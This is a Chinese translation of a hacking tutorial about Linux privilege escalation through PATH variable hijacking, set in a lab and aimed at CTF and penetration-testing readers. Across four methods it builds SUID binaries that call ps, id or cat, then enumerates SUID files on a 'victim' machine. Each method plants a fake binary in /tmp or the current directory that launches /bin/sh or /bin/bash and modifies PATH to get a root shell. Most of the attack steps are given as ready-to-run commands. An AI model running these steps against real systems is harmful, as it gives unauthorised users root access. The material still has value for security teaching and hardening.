**在这篇文章中，我将会为大家介绍一些使用环境变量进行Linux提权的方法，包括在CTF
challenges中使用到一些的技术。话不多说，让我们进入正题！**

## 介绍

PATH是Linux和类Unix操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。

使用echo命令显示当前PATH环境变量：

    
    
    echo $PATH

/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

如果你在PATH变量中看到 **‘.’**
，则意味着登录用户可以从当前目录执行二进制文件/脚本，这对于攻击者而言也是一个提权的绝好机会。这里之所以没有指定程序的完整路径，往往是因为编写程序时的疏忽造成的。

## 方法1

 **Ubuntu LAB SET_UP**

当前，我们位于/home/raj目录，我们将在其中创建一个名为/script的新目录。在script目录下，我们将编写一个小型的c程序来调用系统二进制文件的函数。

    
    
    pwd
    mkdir script
    cd /script
    nano demo.c

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281588453366.png!small)

正如你在demo.c文件中看到的，我们正在调用ps命令。

![2.png在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281588586342.png!small)

然后使用gcc编译demo.c文件，并提升编译文件的SUID权限。

    
    
    ls
    gcc demo.c -o shell
    chmod u+s shell
    ls -la shell

**![3.png在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281588742448.png!small)**

 **受害者VM机器**

假设我们已经成功渗透目标，并进入提权阶段。我们通过ssh成功登录到了受害者的机器。然后使用Find命令，搜索具有SUID或4000权限的文件。

    
    
    find / -perm -u=s -type f 2>/dev/null

通过上述命令，攻击者可以枚举出目标系统上所有的可执行文件，这里可以看到/home/raj/script/shell具有SUID权限。

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281588924440.png!small)

进入到/home/raj/script目录，可以看到该目录下有一个可执行的“shell”文件，我们运行这个文件。

    
    
    /home/raj/script

####
**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281589222776.png!small)**

####  **Echo命令**

    
    
    cd /tmp
    echo “/bin/sh” > ps
    chmod 777 ps
    echo $PATH
    export PATH=/tmp:$PATH
    cd /home/raj/script
    ./shell
    whoami

####
**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281589383502.png!small)**

####  **Copy命令**

    
    
    cd /home/raj/script/
    cp /bin/sh /tmp/ps
    echo $PATH
    export PATH=/tmp:$PATH
    ./shell
    whoami

####
**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281589569238.png!small)**

####  **Symlink命令**

    
    
    ln -s /bin/sh ps
    export PATH=.:$PATH
    ./shell
    id
    whoami

注意：符号链接也叫软链接，如果目录具有完全权限，则它将成功运行。在Ubuntu中symlink情况下，我们已经赋予了/script目录777的权限。

因此，攻击者可以操纵环境变量PATH来进行提权，并获得root访问权限。

##
![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281589902316.png!small)

## 方法2

 **Ubuntu LAB SET_UP**

重复上述步骤配置你的实验环境，现在在脚本目录中，我们将编写一个小型的c程序来调用系统二进制文件的函数。

    
    
    pwd
    mkdir script
    cd /script
    nano demo.c

正如你在demo.c文件中看到的，我们正在调用id命令。

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281590328215.png!small)

然后使用gcc编译demo.c文件，并提升编译文件的SUID权限。

    
    
    ls
    gcc demo.c -o shell2
    chmod u+s shell2
    ls -la shell2

**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281590528235.png!small)**

 **受害者VM机器**

同样，假设我们已经成功渗透目标，并进入提权阶段。我们通过ssh成功登录到了受害者的机器。然后使用Find命令，搜索具有SUID或4000权限的文件。在这里，我们可以看到/home/raj/script/shell2具有SUID权限。

    
    
    find / -perm -u=s -type f 2>/dev/null

进入到/home/raj/script目录，可以看到该目录下有一个可执行的“shell2”文件，我们运行这个文件。

    
    
    cd /home/raj/script
    ls
    ./shell2

####
**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281590748081.png!small)**

####  **Echo命令**

    
    
    cd /tmp
    echo “/bin/sh” > id
    chmod 777 id
    echo $PATH
    export PATH=/tmp:$PATH
    cd /home/raj/script
    ./shell2
    whoami

##
**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281590964641.png!small)**

##  **方法3**

 **Ubuntu LAB SET_UP**

重复上述步骤配置你的实验环境。正如你在demo.c文件中看到的，我们正在调用cat命令从etc/passwd文件中读取内容。

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/1528159124789.png!small)

然后使用gcc编译demo.c文件，并提升编译文件的SUID权限。

    
    
    ls
    gcc demo.c -o raj
    chmod u+s raj
    ls -la raj

**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281591517723.png!small)**

 **受害者VM机器**

同样，假设我们已经成功渗透目标，并进入提权阶段，通过执行以下命令查看sudo用户列表。

    
    
    find / -perm -u=s -type f 2>/dev/null

在这里，我们可以看到/home/raj/script/raj具有SUID权限，进入到home/raj/script/目录，可以看到该目录下有一个可执行的“raj”文件。所以当我们运行这个文件时，它会把etc/passwd文件作为输出结果。

    
    
    cd /home/raj/script/
    ls
    ./raj

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281592297980.png!small)

####  **Nano** **编辑器**

    
    
    cd /tmp
    nano cat

现在，当终端打开时输入/bin/bash并保存。

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281592751060.png!small)

    
    
    chmod 777 cat
    ls -al cat
    echo $PATH
    export PATH=/tmp:$PATH
    cd /home/raj/script
    ./raj
    whoami

##
![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/1528159297941.png!small)

## 方法4

 **Ubuntu LAB SET_UP**

重复上述步骤配置你的实验环境。正如你在demo.c文件中看到的，我们正在调用cat命令读取/home/raj中的msg.txt中的内容，但/home/raj中并没有这样的文件。

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281593217967.png!small)

然后使用gcc编译demo.c文件，并提升编译文件的SUID权限。

    
    
    ls
    gcc demo.c -o ignite
    chmod u+s ignite
    ls -la ignite

**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281593436043.png!small)**

 **受害者VM机器**

同样，假设我们已经成功渗透目标，并进入提权阶段，通过执行以下命令查看sudo用户列表

    
    
    find / -perm -u=s -type f 2>/dev/null

在这里，我们可以看到/home/raj/script/ignite具有SUID权限，进入到/home/raj/script目录，可以看到该目录下有一个可执行的“ignite”文件。所以当我们运行这个文件时，它会报错“cat:
/home/raj/msg.txt”文件或目录不存在。

    
    
    cd /home/raj/script
    ls
    ./ignite

####
**![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281593659929.png!small)**

####  **Vi编辑器**

    
    
    cd /tmp
    vi cat

现在，当终端打开时输入/bin/bash并保存。

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281593904345.png!small)

    
    
    chmod 777 cat
    ls -al cat
    echo $PATH
    export PATH=/tmp:$PATH
    cd /home/raj/script
    ./ignite
    whoami

![在Linux中使用环境变量进行提权](https://image.3001.net/images/20180605/15281594116268.png!small)

 ***参考来源：[hackingarticles](http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

